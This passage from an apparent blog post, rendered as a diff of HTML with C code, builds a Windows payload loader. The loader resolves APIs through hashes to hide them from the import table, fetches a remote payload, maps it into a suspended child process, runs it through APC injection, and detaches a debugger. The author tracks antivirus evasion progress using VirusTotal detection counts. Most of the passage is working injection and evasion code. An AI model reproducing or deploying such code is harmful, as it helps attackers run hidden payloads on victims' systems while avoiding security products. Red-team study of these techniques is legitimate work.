+</span></span><span style="display:flex;"><span>	IN           DWORD                 flProtect,
+</span></span><span style="display:flex;"><span>	IN           DWORD                 dwMaximumSizeHigh,
+</span></span><span style="display:flex;"><span>	IN           DWORD                 dwMaximumSizeLow,
+</span></span><span style="display:flex;"><span>	IN	OPTIONAL LPCWSTR               lpName
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">LPVOID</span>(WINAPI<span style="color:#f92672">*</span> fnMapViewOfFile)(
+</span></span><span style="display:flex;"><span>	IN HANDLE hFileMappingObject,
+</span></span><span style="display:flex;"><span>	IN DWORD  dwDesiredAccess,
+</span></span><span style="display:flex;"><span>	IN DWORD  dwFileOffsetHigh,
+</span></span><span style="display:flex;"><span>	IN DWORD  dwFileOffsetLow,
+</span></span><span style="display:flex;"><span>	IN SIZE_T dwNumberOfBytesToMap
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffilenuma2
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">PVOID</span>(WINAPI<span style="color:#f92672">*</span> fnMapViewOfFileNuma2)(
+</span></span><span style="display:flex;"><span>	IN           HANDLE  FileMappingHandle,
+</span></span><span style="display:flex;"><span>	IN           HANDLE  ProcessHandle,
+</span></span><span style="display:flex;"><span>	IN           ULONG64 Offset,
+</span></span><span style="display:flex;"><span>	IN	OPTIONAL PVOID   BaseAddress,
+</span></span><span style="display:flex;"><span>	IN           SIZE_T  ViewSize,
+</span></span><span style="display:flex;"><span>	IN           ULONG   AllocationType,
+</span></span><span style="display:flex;"><span>	IN           ULONG   PageProtection,
+</span></span><span style="display:flex;"><span>	IN			 ULONG   PreferredNode
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span>(WINAPI<span style="color:#f92672">*</span> fnQueueUserAPC)(
+</span></span><span style="display:flex;"><span>	IN PAPCFUNC  pfnAPC,
+</span></span><span style="display:flex;"><span>	IN HANDLE    hThread,
+</span></span><span style="display:flex;"><span>	IN ULONG_PTR dwData
+</span></span><span style="display:flex;"><span>	);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span>(WINAPI<span style="color:#f92672">*</span> fnDebugActiveProcessStop)(
+</span></span><span style="display:flex;"><span>	IN DWORD dwProcessId
+</span></span><span style="display:flex;"><span>	);
+</span></span></code></pre></div><p>I defined a function called <code>InitApis</code> that populates a pointer value to the <code>H_API</code> structure containing function addresses resolved through custom procedures defined above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">InitApis</span>(
+</span></span><span style="display:flex;"><span>	OUT	PH_API<span style="color:#f92672">*</span>			ppHashedApis
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;g_InitHash: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, g_InitHash);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PWINAPI_MODULE	pKernel32			<span style="color:#f92672">=</span> (PWINAPI_MODULE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(WINAPI_MODULE));
+</span></span><span style="display:flex;"><span>	PWINAPI_MODULE	pKernelbase			<span style="color:#f92672">=</span> (PWINAPI_MODULE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(WINAPI_MODULE));
+</span></span><span style="display:flex;"><span>	PH_API			pHashedApis			<span style="color:#f92672">=</span> (PH_API)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(H_API));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pKernel32 <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pKernelbase <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pHashedApis) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to allocate memory in InitApis.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pKernel32<span style="color:#f92672">-&gt;</span>ModuleHash <span style="color:#f92672">=</span> KERNEL32_DLL_FnvvW;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetModuleHandleCustom</span>(pKernel32);				<span style="color:#75715e">// populates pKernel32-&gt;ModuleHandle
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pKernel32<span style="color:#f92672">-&gt;</span>ModuleHandle) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to retrive kernel32.dll handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pKernelbase<span style="color:#f92672">-&gt;</span>ModuleHash <span style="color:#f92672">=</span> KERNELBASE_DLL_FnnvW;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetModuleHandleCustom</span>(pKernelbase);				<span style="color:#75715e">// populates pKernelbase-&gt;ModuleHandle
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pKernelbase<span style="color:#f92672">-&gt;</span>ModuleHandle) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to retrive kernelbase.dll handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pCreateProcessW <span style="color:#f92672">=</span> (fnCreateProcessW)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, CreateProcessW_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pCreateProcessW) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve CreateProcessW.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">CreateProcessW</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pCreateProcessW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pWriteProcessMemory <span style="color:#f92672">=</span> (fnWriteProcessMemory)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, WriteProcessMemory_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pWriteProcessMemory) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve WriteProcessMemory.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">WriteProcessMemory</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pWriteProcessMemory);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pCreateFileMappingW <span style="color:#f92672">=</span> (fnCreateFileMappingW)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, CreateFileMappingW_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pCreateFileMappingW) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve CreateFileMappingW.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">CreateFileMappingW</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pCreateFileMappingW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFile <span style="color:#f92672">=</span> (fnMapViewOfFile)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, MapViewOfFile_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFile) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve MapViewOfFile.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">MapViewOfFile</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFile);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pQueueUserAPC <span style="color:#f92672">=</span> (fnQueueUserAPC)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, QueueUserAPC_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pQueueUserAPC) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve QueueUserAPC.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">QueueUserAPC</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pQueueUserAPC);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pDebugActiveProcessStop <span style="color:#f92672">=</span> (fnDebugActiveProcessStop)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernel32, DebugActiveProcessStop_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pDebugActiveProcessStop) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve DebugActiveProcessStop.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">DebugActiveProcessStop</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pDebugActiveProcessStop);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFileNuma2 <span style="color:#f92672">=</span> (fnMapViewOfFileNuma2)<span style="color:#a6e22e">GetProcAddressCustom</span>(pKernelbase, MapViewOfFileNuma2_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFileNuma2) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve MapViewOfFileNuma2.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">MapViewOfFileNuma2</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pMapViewOfFileNuma2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppHashedApis	<span style="color:#f92672">=</span> pHashedApis;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>DEBUG_PRINT</code> macro comes from the codebase described in my <a href="https://ashtrace.github.io/posts/my_first_loader/">previous blog</a>.</p>
+<p>The <code>DEBUG_PRINT</code> macro helps me to strip the debug <code>printf</code> statements and hardcoded debug strings at compilation. It controlled by <code>LOG_DEBUG_MSG</code>, when defined the <code>DEBUG_PRINT</code> statements are essentially <code>printf</code> calls specifying file and line number along with the message passed. When <code>LOG_DEBUG_MSG</code> is not defined, <code>DEBUG_PRINT</code> turns to be just a void statement.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DEBUG_PRINT(fmt, ...) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	printf(&#34;[DEBUG] (%s:%d) &#34; fmt &#34;\n&#34;, __FILE__, __LINE__,  ##__VA_ARGS__)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define	DEBUG_PRINT(fmt, ...) ((void)0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif </span><span style="color:#75715e">// !LOG_DEBUG_MSG
+</span></span></span></code></pre></div><h3 id="the-import-problem">The import problem</h3>
+<p>Remember the <code>__TIME__</code> in compile-time random seed generation? It came to bite me as for every source file where the hashing capabilities were added, it defined a new <code>g_InitHash</code> value. To tackle this:</p>
+<ul>
+<li>
+<p>I limited the import of hash function definitions only within the resolution logic, thus the compile-time hashes are defined within the scope of source-code concerned with hash-based resolution.</p>
+</li>
+<li>
+<p>The <code>InitApis</code> function acts as an entry point into the function resolution flow.</p>
+</li>
+<li>
+<p>The <code>main</code> function is made aware of <code>InitApis</code> through following statment (as header with function declaration as it would cascade into hash functions being re-evaluated for <code>main</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> BOOL <span style="color:#a6e22e">InitApis</span>(
+</span></span><span style="display:flex;"><span>    OUT	PH_API<span style="color:#f92672">*</span>			ppHashedApi
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div></li>
+</ul>
+<p>Thus the <code>main</code> function:</p>
+<ul>
+<li>Leverages <code>InitApis</code> to initialize the functions through their hashes.</li>
+<li>Call the helper functions to
+<ul>
+<li>fetch the payload</li>
+<li>create a child process</li>
+<li>inject mapping into the child process</li>
+<li>schedule call to payload through APC injection</li>
+</ul>
+</li>
+<li>Remove the debugger to execute the APC call.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;common.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> BOOL <span style="color:#a6e22e">InitApis</span>(
+</span></span><span style="display:flex;"><span>	OUT	PH_API<span style="color:#f92672">*</span>			ppHashedApi
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">**</span> argv) {
+</span></span><span style="display:flex;"><span>	PBYTE			pBlob			<span style="color:#f92672">=</span> NULL,
+</span></span><span style="display:flex;"><span>					pBlobCopy		<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	SIZE_T			sBlobSize		<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	HANDLE			hProcess		<span style="color:#f92672">=</span> NULL,
+</span></span><span style="display:flex;"><span>					hThread			<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	DWORD			dwProcessID		<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	PH_API			pHashedApis	<span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">InitApis</span>(<span style="color:#f92672">&amp;</span>pHashedApis);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">FetchBlob</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>pBlob, <span style="color:#f92672">&amp;</span>sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CreateSuspendedProcess</span>(pHashedApis, argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">&amp;</span>hProcess, <span style="color:#f92672">&amp;</span>hThread, <span style="color:#f92672">&amp;</span>dwProcessID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CopyBlob</span>(pHashedApis, hProcess, pBlob, sBlobSize, <span style="color:#f92672">&amp;</span>pBlobCopy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ScheduleRun</span>(pHashedApis, hThread, pBlobCopy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pDebugActiveProcessStop</span>(dwProcessID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;PAUSE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif </span><span style="color:#75715e">// !LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Notice that helper functions now recieve the hash-resolved-function-address structure to leverage the WinAPIs through their calculated addresses. Same occurs for removing the debugger, wher <code>DebugActiveProcessStop</code> is being called through its address stored in the <code>HashedApis</code> structure.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pHashedApis<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pDebugActiveProcessStop</span>(dwProcessID);
+</span></span></code></pre></div><h3 id="benchmarks">Benchmarks</h3>
+<p>All of this kung-fu resulted in removing the mentioned infamous functions from the binary IAT. The left pane shows the IAT of loader version from last blog-post, the right pane shows the IAT with function hashing.</p>
+<p><img src="./loader3-vs-netutil5-iat.png" alt="loader3-vs-netutil5-iat"></p>
+<p>A submission on virustotal showed that the detection score dropped from 6 to 5.</p>
+<p><img src="./NetUtil5-virustotal.png" alt="NetUtil5-virustotal"></p>
+<p>While a decrement of single unit was appreciated, it wasn&rsquo;t much. As the engine was already in place, I hashed the WinInet functions too. The updated <code>InitApis</code> function included</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">InitApis</span>(
+</span></span><span style="display:flex;"><span>	OUT	PH_API<span style="color:#f92672">*</span> ppHashedApis
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PWINAPI_MODULE	pWininet	<span style="color:#f92672">=</span> (PWINAPI_MODULE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(WINAPI_MODULE));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pKernel32 <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pKernelbase <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pWininet <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pHashedApis) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to allocate memory in InitApis.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ..,
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pKernelbase<span style="color:#f92672">-&gt;</span>ModuleHandle) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to retrive kernelbase.dll handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pWininet<span style="color:#f92672">-&gt;</span>ModuleHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibraryW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Wininet.dll&#34;</span>); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... 
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenW <span style="color:#f92672">=</span> (fnInternetOpenW)<span style="color:#a6e22e">GetProcAddressCustom</span>(pWininet, InternetOpenW_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenW) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve InternetOpenW.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">InternetOpenW</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenUrlW <span style="color:#f92672">=</span> (fnInternetOpenUrlW)<span style="color:#a6e22e">GetProcAddressCustom</span>(pWininet, InternetOpenUrlW_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenUrlW) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve InternetOpenUrlW.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
